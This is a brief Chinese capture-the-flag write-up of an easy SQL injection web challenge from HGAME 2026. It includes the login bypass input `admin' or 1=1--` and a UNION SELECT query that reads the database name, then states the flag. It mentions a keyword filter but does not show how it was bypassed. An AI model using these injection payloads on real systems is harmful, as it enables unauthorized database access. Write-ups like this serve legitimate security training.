---
title: "ez_sql — SQL 注入入门"
date: 2026-05-01
event: "HGAME 2026"
category: "Web"
difficulty: "Easy"
tags: ["SQL注入", "联合查询"]
rank: 3
team: "TTTeam"
---

## 漏洞发现

打开题目，是一个登录页面。尝试输入 `admin' or 1=1--` 发现存在 SQL 注入点。

使用 `order by` 判断列数为 3，联合查询发现关键字被过滤。

## 利用过程

```sql
-- 查看当前数据库
UNION SELECT 1,database(),3--
-- 结果: hgame_web
```

## Flag 获取

成功获取 Flag：`flag{ez_sql_1nject10n_b4sic}`

## 总结

本题是一道经典的 SQL 注入入门题，考察联合查询和绕过技巧。
